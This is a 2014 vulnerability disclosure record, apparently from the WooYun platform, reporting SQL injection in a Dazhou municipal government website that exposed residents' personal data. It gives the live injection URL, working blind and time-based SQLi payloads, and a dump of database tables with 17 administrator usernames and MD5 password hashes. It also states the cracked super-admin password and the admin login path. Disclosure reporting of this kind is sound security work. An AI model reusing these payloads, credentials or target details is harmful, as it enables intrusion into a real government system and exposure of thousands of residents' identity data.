{"id": 56098, "wybug_id": "wooyun-2014-058918", "wybug_title": "四川省达州市某政府网站SQL注射（居民姓名＋身份证＋电话＋住址＋单位泄漏）", "wybug_corp": "四川省达州市政府", "wybug_author": "PythonPig", "wybug_date": "2014-08-25 19:01", "wybug_open_date": "2014-10-09 19:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "管理后台对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向公众公开  简要描述： 四川省达州市某政府网站SQL注射，可后台，2W居民姓名＋身份证＋电话＋住址＋单位泄漏 详细说明：  只做了一般性的测试，没有进一步的行为！注入点（搜索型注入）：http://www.dzhm.org.cn/newssearch.php?KeyWord=11\n<Place: GETParameter: KeyWord    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: KeyWord=11%' AND 4022=4022 AND '%'='    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: KeyWord=11%' AND SLEEP(5) AND '%'='---[06:30:03] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2008web application technology: Microsoft IIS 7.5, ASP.NET, PHP 5.2.17back-end DBMS: MySQL 5.0.11\n1，该站的数据库：\navailable databases [2]:[*] dzshmbfzx[*] information_schema\n2,dzshmbfzx中的表：\nDatabase: dzshmbfzx[9 tables]+-----------+| tadmin    || tcategory || tckoushet || tgroup    || tjiejian  || tliuyan   || tnews     || tpage     || tsmssend  |+-----------+\n3，tadmin中的管理员用户名及密码\nDatabase: dzshmbfzxTable: tadmin[17 entries]+----+-------------+----------------------------------+| ID | dname       | dpass                            |+----+-------------+----------------------------------+| 1  | wenbin      | f4538d581ec3977ac4ca6aa63391c46a || 62 | gonghui114  | 212200a956f5585cfd5da8c611957ef1 || 63 | minzheng121 | 23f57dcaa87ff15ae671a38c6dc21dad || 64 | gonghui115  | 212200a956f5585cfd5da8c611957ef1 || 65 | tuanwei116  | e6012d21170413530f9ae447f0ea35e7 || 66 | fulian118   | 41dd3171b60f876e910090d30063f5a4 || 67 | falv119     | b6392f01c4221f8ab1ffa7f1302b8ce6 || 68 | falv120     | b6392f01c4221f8ab1ffa7f1302b8ce6 || 69 | jiaoyu123   | 28d9ce716e8841b945b59b22507ca969 || 70 | jiaoyu124   | 28d9ce716e8841b945b59b22507ca969 || 71 | canlian125  | 073ccd4b94404ed99b6e80917bb946b5 || 72 | canlian126  | 073ccd4b94404ed99b6e80917bb946b5 || 73 | zhufang128  | fc1089d26a527f908dfa4c738d2b 2fa || 74 | xindai129   | d7b1a436bbd0257e0e985a225d2d33db || 75 | jiuye130    | d826e40b5f763d51e4140f5fcf8c4081 || 78 | gongjiao    | b5d908c3aea4a605b40806751470e66d || 79 | duchake     | e413b12c178ca44d8d694cbb94159d6f |+----+-------------+----------------------------------+\nMD5解密后可以得到各个管理员的密码，其中一个超级管理员的帐号为：wenbin 密码为：wenbin123,测试可以登录后台：www.dzhm.org.cn/admin/login.php4，进入后台以后，发现有上传点，及近2W居民信息，包括姓名，身份证号码，电话，家庭住址，工作单位等\n\n\n\n\n\n\n\n   漏洞证明：  \n+----+-------------+----------------------------------+| ID | dname       | dpass                            |+----+-------------+----------------------------------+| 1  | wenbin      | f4538d581ec3977ac4ca6aa63391c46a || 62 | gonghui114  | 212200a956f5585cfd5da8c611957ef1 || 63 | minzheng121 | 23f57dcaa87ff15ae671a38c6dc21dad || 64 | gonghui115  | 212200a956f5585cfd5da8c611957ef1 || 65 | tuanwei116  | e6012d21170413530f9ae447f0ea35e7 || 66 | fulian118   | 41dd3171b60f876e910090d30063f5a4 || 67 | falv119     | b6392f01c4221f8ab1ffa7f1302b8ce6 || 68 | falv120     | b6392f01c4221f8ab1ffa7f1302b8ce6 || 69 | jiaoyu123   | 28d9ce716e8841b945b59b22507ca969 || 70 | jiaoyu124   | 28d9ce716e8841b945b59b22507ca969 || 71 | canlian125  | 073ccd4b94404ed99b6e80917bb946b5 || 72 | canlian126  | 073ccd4b94404ed99b6e80917bb946b5 || 73 | zhufang128  | fc1089d26a527f908dfa4c738d2b 2fa || 74 | xindai129   | d7b1a436bbd0257e0e985a225d2d33db || 75 | jiuye130    | d826e40b5f763d51e4140f5fcf8c4081 || 78 | gongjiao    | b5d908c3aea4a605b40806751470e66d || 79 | duchake     | e413b12c178ca44d8d694cbb94159d6f |+----+-------------+----------------------------------+\n\n\n\n\n\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 PythonPig@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-08-30 12:29 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}